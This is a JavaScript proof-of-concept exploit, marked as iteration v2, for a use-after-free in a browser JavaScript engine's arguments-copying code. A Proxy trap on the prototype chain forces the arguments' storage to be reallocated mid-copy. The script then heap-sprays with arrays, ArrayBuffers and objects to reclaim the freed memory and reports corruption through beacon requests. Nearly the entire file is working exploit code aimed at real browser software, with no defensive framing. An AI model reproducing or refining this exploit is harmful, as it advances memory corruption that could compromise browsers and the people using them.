// p221 — ClonedArguments butterfly UAF v2
//
// Bug: ClonedArguments::copyToArguments (line 288-289) caches
// butterfly->contiguous().data() as raw pointer `data`.
// On a hole (line 294), get() runs which walks the prototype chain.
// Proxy on prototype → arbitrary JS → grow args → butterfly reallocated.
// Next loop iteration reads from stale `data` pointer.
//
// v1 (p220) confirmed: Proxy trap fires, returns custom value at hole.
// But spray with ArrayBuffers didn't reclaim the old butterfly.
// v2 fix: spray with JS arrays (same butterfly allocation path).
//
// No JIT required. LLInt op_call_varargs → loadVarargs → copyToArguments.
//
// Beacon prefix: V221-

(function() {
  function B(tag, body) {
    var url = '/beacon/V221-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  function target() { return arguments; }

  function receiver() {
    return Array.prototype.slice.call(arguments);
  }

  // ---- Approach A: Spray with JS arrays of same butterfly size ----
  // 32 args → butterfly = IndexingHeader(8) + 32*8 = 264 bytes
  // After realloc (grow to 500+), old 264-byte region is freed.
  // Spray with arrays of exactly 32 JSValues to reclaim.

  var NARGS = 32;
  var HOLE = 3;
  var SPRAY_COUNT = 4000;
  var reallocCount = 0;
  var sprayArrays = [];

  B('PHASE-A');

  try {
    var manyArgs = [];
    for (var a = 0; a < NARGS; a++) manyArgs.push(a + 1);
    var args1 = target.apply(null, manyArgs);

    delete args1[HOLE];
    B('ARGS-LEN-' + args1.length);

    var trap = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount === 1) {
          B('TRAP-' + prop);

          // Grow the args object to force butterfly reallocation
          for (var j = 200; j < 700; j++) {
            args1[j] = 0x43434343;
          }
          B('GREW');

          // Spray with JS arrays — same butterfly allocation path
          // Each array with 32 doubles → butterfly same size as old one
          // Fill with recognizable pattern
          for (var s = 0; s < SPRAY_COUNT; s++) {
            var arr = [];
            for (var k = 0; k < NARGS; k++) {
              // Use double values that encode as known bit patterns
              // 0xDEAD0000 | s in upper, k in lower
              arr.push(0xDEAD0000 + s * 256 + k);
            }
            sprayArrays.push(arr);
          }
          B('SPRAYED-' + sprayArrays.length);
        }
        return 0xBEEF0000 | (reallocCount & 0xFFFF);
      }
    };

    Object.setPrototypeOf(args1, new Proxy({}, trap));
    B('PROTO-SET');

    var result1;
    try {
      result1 = receiver.apply(null, args1);
    } catch (e) {
      B('APPLY-ERR-' + e.message.substring(0, 40));
      result1 = null;
    }

    if (result1) {
      B('RES-LEN-' + result1.length);
      var vals = [];
      var corruptCount = 0;
      for (var r = 0; r < Math.min(result1.length, NARGS); r++) {
        var v = result1[r];
        var expected = r + 1;
        if (r === HOLE) expected = 0xBEEF0001;
        if (typeof v === 'number') {
          var u = v >>> 0;
          if (r === HOLE) {
            vals.push(r + '=' + hex(u));
          } else if (u !== expected) {
            corruptCount++;
            vals.push(r + '=' + hex(u) + '!=' + hex(expected));
          }
        } else if (typeof v === 'undefined') {
          if (r !== HOLE) {
            corruptCount++;
            vals.push(r + '=undef');
          }
        } else if (typeof v === 'object') {
          corruptCount++;
          vals.push(r + '=obj');
        } else {
          vals.push(r + '=' + typeof v);
        }
      }
      B('CORRUPT-' + corruptCount);
      if (vals.length > 0) B('VALS', vals.join(' '));
      if (corruptCount > 0) B('UAF-A-CONFIRMED');
    }
  } catch (e) {
    B('A-ERR-' + e.message.substring(0, 50));
  }

  // ---- Approach B: Spray with typed arrays of exact size ----
  // Butterfly for NARGS elements = 8 + NARGS*8 = 264 bytes
  // Allocation starts at butterfly-8 (before IndexingHeader)
  // Try ArrayBuffers matching the EXACT allocation size class
  B('PHASE-B');
  reallocCount = 0;
  var bSprayBufs = [];
  var bSprayViews = [];

  try {
    var manyArgs2 = [];
    for (var a = 0; a < NARGS; a++) manyArgs2.push(a + 1);
    var args2 = target.apply(null, manyArgs2);

    // Multiple holes spread across
    delete args2[3];
    delete args2[7];
    delete args2[15];
    delete args2[23];

    var trap2 = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount === 1) {
          B('TRAP-B-' + prop);

          // Grow to force realloc
          for (var j = 200; j < 700; j++) args2[j] = 0x44444444;
          B('GREW-B');

          // bmalloc dealloc log flush: alloc/free many matching-size objects
          // Use 256-byte and 272-byte buffers (bracket the 264-byte target)
          for (var f = 0; f < 200; f++) {
            var tmp = new ArrayBuffer(256);
            var tmp2 = new ArrayBuffer(272);
          }

          // Now spray exact-size buffers with marker data
          for (var s = 0; s < SPRAY_COUNT; s++) {
            var ab = new ArrayBuffer(264);
            var view = new Float64Array(ab);
            for (var k = 0; k < view.length; k++) {
              // Create identifiable float64 values
              // Use small integers that won't be confused with pointers
              view[k] = 0xCAFE0000 + s * 100 + k;
            }
            bSprayBufs.push(ab);
            bSprayViews.push(view);
          }
          B('SPRAYED-B-' + bSprayBufs.length);
        }
        return 0xFACE0000 | (reallocCount & 0xFFFF);
      }
    };

    Object.setPrototypeOf(args2, new Proxy({}, trap2));
    B('PROTO-B-SET');

    var result2;
    try {
      result2 = receiver.apply(null, args2);
    } catch (e) {
      B('APPLY-B-ERR-' + e.message.substring(0, 40));
      result2 = null;
    }

    if (result2) {
      B('RES-B-LEN-' + result2.length);
      var holes = [3, 7, 15, 23];
      var bVals = [];
      var bCorrupt = 0;
      for (var r = 0; r < Math.min(result2.length, NARGS); r++) {
        var v = result2[r];
        var isHole = holes.indexOf(r) >= 0;
        var expected = r + 1;
        if (typeof v === 'number') {
          var u = v >>> 0;
          if (isHole) {
            bVals.push(r + '=H:' + hex(u));
          } else if (u !== expected) {
            bCorrupt++;
            bVals.push(r + '=' + hex(u));
          }
          // Check for spray pattern 0xCAFExxxx
          if ((u >>> 16) === 0xCAFE) {
            bCorrupt += 10; // strong signal
            bVals.push(r + '=SPRAY:' + hex(u));
          }
        } else if (typeof v === 'undefined') {
          if (!isHole) {
            bCorrupt++;
            bVals.push(r + '=undef');
          }
        } else if (typeof v === 'object') {
          bCorrupt++;
          bVals.push(r + '=obj');
        }
      }
      B('CORRUPT-B-' + bCorrupt);
      if (bVals.length > 0) B('VALS-B', bVals.join(' '));
      if (bCorrupt > 0) B('UAF-B-CONFIRMED');
    }
  } catch (e) {
    B('B-ERR-' + e.message.substring(0, 50));
  }

  // ---- Approach C: Use structuredClone to create same-layout objects ----
  B('PHASE-C');
  reallocCount = 0;
  var cSpray = [];

  try {
    var manyArgs3 = [];
    for (var a = 0; a < NARGS; a++) manyArgs3.push(a + 1);
    var args3 = target.apply(null, manyArgs3);

    delete args3[5];
    delete args3[11];
    delete args3[19];

    var trap3 = {
      get: function(t, prop, r) {
        reallocCount++;
        if (reallocCount === 1) {
          B('TRAP-C-' + prop);
          for (var j = 200; j < 700; j++) args3[j] = 0x45454545;
          B('GREW-C');

          // Spray with plain objects that have numbered properties
          // These store named properties in butterfly (same allocator)
          for (var s = 0; s < SPRAY_COUNT; s++) {
            var obj = {};
            for (var k = 0; k < NARGS; k++) {
              obj['p' + k] = 0xD0D00000 + s * 100 + k;
            }
            cSpray.push(obj);
          }
          B('SPRAYED-C-' + cSpray.length);
        }
        return 0xD00D0000 | (reallocCount & 0xFFFF);
      }
    };

    Object.setPrototypeOf(args3, new Proxy({}, trap3));
    B('PROTO-C-SET');

    var result3;
    try {
      result3 = receiver.apply(null, args3);
    } catch (e) {
      B('APPLY-C-ERR-' + e.message.substring(0, 40));
      result3 = null;
    }

    if (result3) {
      B('RES-C-LEN-' + result3.length);
      var holes3 = [5, 11, 19];
      var cVals = [];
      var cCorrupt = 0;
      for (var r = 0; r < Math.min(result3.length, NARGS); r++) {
        var v = result3[r];
        var isHole = holes3.indexOf(r) >= 0;
        var expected = r + 1;
        if (typeof v === 'number') {
          var u = v >>> 0;
          if (isHole) {
            cVals.push(r + '=H:' + hex(u));
          } else if (u !== expected) {
            cCorrupt++;
            cVals.push(r + '=' + hex(u));
          }
          if ((u >>> 16) === 0xD0D0) {
            cCorrupt += 10;
            cVals.push(r + '=SPRAY:' + hex(u));
          }
        } else if (typeof v === 'undefined') {
          if (!isHole) { cCorrupt++; cVals.push(r + '=undef'); }
        } else if (typeof v === 'object') {
          cCorrupt++; cVals.push(r + '=obj');
        }
      }
      B('CORRUPT-C-' + cCorrupt);
      if (cVals.length > 0) B('VALS-C', cVals.join(' '));
      if (cCorrupt > 0) B('UAF-C-CONFIRMED');
    }
  } catch (e) {
    B('C-ERR-' + e.message.substring(0, 50));
  }

  B('DONE');
})();
